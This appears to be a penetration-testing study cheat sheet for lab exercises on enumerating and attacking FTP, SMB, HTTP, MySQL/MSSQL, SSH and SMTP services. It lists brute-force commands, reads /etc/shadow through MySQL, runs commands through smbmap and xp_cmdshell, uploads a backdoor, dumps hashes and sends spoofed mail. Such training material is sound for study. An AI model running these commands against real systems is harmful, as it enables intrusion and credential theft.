# Service Enumeration Reference

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 1805–2088. Examples are lab-specific and need verification.

## **Service Enumeration@**

- FTP Enumeration@
    - FTP

        FTP (**File Transfer Protocol**) - a client-server protocol used to transfer files between a network using TCP/UDP connections.
        Default FTP port is **21**, opened when FTP is activated for sharing data.

        - `nmap -p21 -sV -sC -O 192.217.238.3`
        - Try Anonymous login `ftp 192.217.238.3` - failed
        - `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.217.238.3 -t 4 ftp`- hydra brute force
        - `nmap --script ftp-brute --script-args userdb=/root/users -p21 192.217.238.3` - nmap to brute password
        - `nmap --script ftp-anon -p21 192.119.169.3` - nmap anonymous login script

- SMB Enumeration
    - SMB

        SMB (**Server Message Block**) - a network file and resource sharing protocol, based on a client-server model. Usually SMB can be found on ports **139 or 445**

        **SMB nmap scripts**

        `nmap -p445 -sV -sC -O <TARGET_IP>`

        After finding SMB through port scanning, gather more information with nmap.

        - `nmap -p445 --script smb-protocols 10.2.24.25` - SMB Protocols
        - `nmap -p445 --script smb-security-mode 10.2.24.25` - SMB Security levels
        - `nmap -p445 --script smb-enum-sessions 10.2.24.25` - SMB logged in users
        - `nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - login admin default
        - `nmap -p445 --script smb-enum-shares 10.2.24.25` - SMB shares
        - `nmap -p445 --script smb-enum-users 10.2.24.25` - SMB users
        - `nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - SMB windows users
        - `nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - Server statistics
        - `nmap -p445 --script smb-enum-domains--script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - system domains
        - `nmap -p445 --script smb-enum-groups--script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - Available groups
        - `nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - Services
        - `nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - ls cmd

        **SMBMap**

        - `nmap -p445 --script smb-protocols 10.2.21.233`
        - `smbmap -u guest -p "" -d . -H 10.2.21.233`
        - `smbmap -u administrator -p smbserver_771 -d . -H 10.2.21.233` - Login
        - `smbmap -u administrator -p smbserver_771 -H 10.2.21.233 -x 'ipconfig’` - Running commands
        - `smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 -L` - List all drives
        - `smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 -r 'C$’` - List directory contents
        - `smbmap -u admin -p password1 -H 192.174.58.3` - SMB shares using credentials
        - `smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 --upload '/root/sample_backdoor' 'C$\sample_backdoor’` - Upload file
        - `smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 --download 'C$\flag.txt’` - Download a file

        **SMB Recon - Basics 1**

        - `nmap -sV -p 139,445 192.28.157.3`
        - `nmap --script smb-os-discovery -p 445 192.28.157.3` - SMB OS detection

        **rpcclient**

        It is a tool for executing client side MS-RPC functions

        - `nmap 192.230.128.3`
        - `rpcclient -U "" -N 192.230.128.3`
        - rpcclient $> `srvinfo`
        - rpcclient $> `enumdomusers` - users
        - rpcclient $> `enumdomgroups` - groups
        - rpcclient $> `lookupnames admin` - SID of user “admin” using rpcclient.

        **enum4linux** - tool for enumerating data from Windows and Samba hosts

        - `enum4linux -o 192.230.128.3`
        - `enum4linux -U 192.230.128.3` - users
        - `enum4linux -S 192.187.39.3` - shares
        - `enum4linux -G 192.187.39.3` - domain groups
        - `enum4linux -i 192.187.39.3` - Check if samba server is configured for printing
        - `enum4linux -r -u "admin" -p "password1" 192.174.58.3` - List users SUID

        **Metasploit**

        - `use auxiliary/scanner/smb/smb_version`
        - `use auxiliary/scanner/smb/smb_enumusers`
        - `use auxiliary/scanner/smb/smb_enumshares`
        - `use auxiliary/scanner/smb/pipe_auditor` - user cred: admin-password1

        **nmblookup**

        NetBIOS over TCP/IP client used to lookup NetBIOS names

        - `nmblookup -A 192.28.157.3`

        **smbclient**

        Ftp-like client to access SMB/CIFS resources on servers

        - `smbclient -L 192.28.157.3 -N`
        - `smbclient [//192.187.39.3/public](https://192.187.39.3/public) -N`
        - `smbclient -L 192.28.157.3 -U jane` - use “abc123” as password
        - `smbclient [//192.174.58.3/jane](https://192.174.58.3/jane) -U jane`
        - `smbclient [//192.174.58.3/admin](https://192.174.58.3/admin) -U admin` - use “password1” as password
        - `smb> get flag` - Important cat and type wont work in smb

        **Dictionary Attack**

        - `nmap -Pn -sV 192.174.58.3`
        - `msfconsole`
        - `use auxiliary/scanner/smb/smb_login`
        - `set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt`
        - `set SMBUser jane` - Known already specified in the lab description, will not be same in the exam
        - `set RHOSTS 192.174.58.3`
        - `exploit`

        **Hydra**

        - `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.174.58.3 smb`

- Web Server Enumeration: http

    - HTTP

        HTTP (**Hyper Text Transfer Protocol**) - a client-server application layer protocol, used to load web pages using hypertext links.
        Default HTTP port is **80** and HTTPS port is **443.**

        - `nmap -p80 -sV -O 10.4.16.17`
        - `whatweb 10.4.16.17`
        - `http 10.4.16.17`
        - `dirb http://10.4.16.17`
        - `browsh --startup-url http://10.4.16.17/Default.aspx`
        - `nmap --script=http-enum -sV -p80 10.4.21.207` - http enum nmap script
        - `nmap -sV -p 80 10.4.21.207 -script banner`
        - `nmap --script=http-methods --script-args http-methods.url-path=/webdav/ -p80 10.4.21.207` - http methods nmap script
        - `curl 192.199.232.3 | more` - curl cmd
        - `use auxiliary/scanner/http/brute_dirs` - Directory brute-force
        - `use auxiliary/scanner/http/http_version` - http version

        **HTTP Login**

        - `msfconsole`
        - `use auxiliary/scanner/http/http_login`
        - `set RHOSTS 192.199.232.3`
        - `set USER_FILE /tmp/users`
        - `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
        - `set VERBOSE false`
        - `set AUTH_URI /dir/`
        - `exploit`

- MySQL Enumeration

    - MYSQL

        MYSQL - an open-source relational database management system, used to add, access and process data stored in a server database using the SQL (Structured Query Language) syntax. It's also included in the LAMP technology stack (Linux, Apache, MySQL, PHP) to store and retrieve data in well-known applications, websites and services.
        Default MYSQL port is **3306**

        - `nmap -sV -p3306 192.49.51.3`
        - `mysql -h 192.49.51.3 -u root`
        - `mysql > show databases;`
        - `mydql> select load_file(”/etc/shadow”);`

        **Metasploit Enum**

        - `msfconsole`
        - `use auxiliary/scanner/mysql/mysql_schemadump` - schema dump
        - `set RHOSTS 192.49.51.3`
        - `set USERNAME root`
        - `set PASSWORD "”`
        - `exploit`

        - `use auxiliary/scanner/mysql/mysql_writable_dirs` - writable dirs
        - `set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt`
        - `set RHOSTS 192.49.51.3`
        - `set VERBOSE false`
        - `set PASSWORD "”`
        - `exploit`

        - `use auxiliary/scanner/mysql/mysql_file_enum`  - File enum
        - `set RHOSTS 192.49.51.3`
        - `set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt`
        - `set PASSWORD "”`
        - `exploit`

        - `use auxiliary/scanner/mysql/mysql_hashdump`  - hash dump
        - `set RHOSTS 192.49.51.3`
        - `set USERNAME root`
        - `set PASSWORD "”`
        - `exploit`

        **Nmap Scripts**

        - `nmap --script ms-sql-info -p1433 10.4.21.27`- Info
        - `nmap --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 -p1433 10.4.21.27` - ntlm info
        - `nmap --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt -p1433 10.4.21.27` - enumerate users and passwords
        - `nmap --script ms-sql-empty-password -p1433 10.4.21.27` - check empty password users
        - `nmap --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria -p1433 10.4.21.27` - Dump MSSQL users hashes
        - `nmap --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig" -p1433 10.4.21.27` cmd shell
        - `nmap --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" -p1433 10.4.21.27` - cmd shell

        **MYSQL Login**

        **Metasploit**

        - `nmap -sV -p3306 192.222.16.3`
        - `msfconsole`
        - `use auxiliary/scanner/mysql/mysql_login`
        - `set RHOSTS 192.222.16.3`
        - `set USERNAME root`
        - `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
        - `set VERBOSE false`
        - `set STOP_ON_SUCCESS true`
        - `exploit`

        **Hydra**

        - `hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.222.16.3 mysql`

        **MSSQL Enum with Metasploit port- 1433**

        - `nmap --script ms-sql-info -p1433 10.4.23.176`
        - `msfconsole`
        - `use auxiliary/scanner/mssql/mssql_login`
        - `set RHOSTS 10.4.23.176`
        - `set USER_FILE /root/Desktop/wordlist/common_users.txt`
        - `set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt`
        - `set VERBOSE false`
        - `exploit`

        - `use auxiliary/admin/mssql/mssql_enum`
        - `set RHOSTS 10.4.23.176`
        - `exploit`

        - `use auxiliary/admin/mssql/mssql_enum_sql_logins`
        - `set RHOSTS 10.4.23.176`
        - `exploit`

        - `use auxiliary/admin/mssql/mssql_exec`
        - `set RHOSTS 10.4.23.176`
        - `set CMD whoami`
        - `exploit`

        - `use auxiliary/admin/mssql/mssql_enum_domain_accounts`
        - `set RHOSTS 10.4.23.176`
        - `exploit`

- SSH Enumeration

    - SSH

        SSH (**Secure Shell Protocol)** - a cryptographic network protocol for operating network services securely over an unsecured network, based on a client-server model. Default SSH TCP port is **22**.

        - `nmap -p22 -sV -sC -O 192.8.3.3`
        - `nc 192.8.3.3 22` - Banner grabbing
        - `ssh [root@192.8.3.3](mailto:root@192.8.3.3) 22`
        - `nmap --script ssh2-enum-algos 192.8.3.3` - nmap enum-alogo script
        - `nmap --script ssh-hostkey --script-args ssh_hostkey=full 192.8.3.3` - nmap ssh hostkey script
        - `nmap -p22 --script ssh-auth-methods --script-args="ssh.user=student" 192.8.3.3` - nmap ssh auth method scripts
        - `ssh student@192.8.3.3`

        **Dictionary Attack**

        - `hydra -l student -P /usr/share/wordlists/rockyou.txt 192.230.83.3 ssh`
        - `nmap -p22 --script=ssh-brute --script-args userdb=/root/users 192.230.83.3`
        - Msfconsole
            - `use auxiliary/scanner/ssh/ssh_login`
            - `set RHOSTS 192.230.83.3`
            - `set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt`
            - `set STOP_ON_SUCCESS true`
            - `set VERBOSE true`
            - `exploit`

- SMTP Enumeration

    - SMTP

        SMTP (**Simple Mail Transfer Protocol)** - a communication protocol used for the transmission of email.
        Default SMTP TCP port is **25.**

        - `nmap -sV 192.63.243.3`
        - `nc 192.63.243.3 25` - banner grabbing
        - `telnet 192.63.243.3 25` - telnet
        - `smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t 192.63.243.3` - user enum
        - `use auxiliary/scanner/smtp/smtp_enum`
        - `sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s 192.63.243.3 -u Fakemail -m "Hi root, a fake mail from admin" -o tls=no` - send fake mail
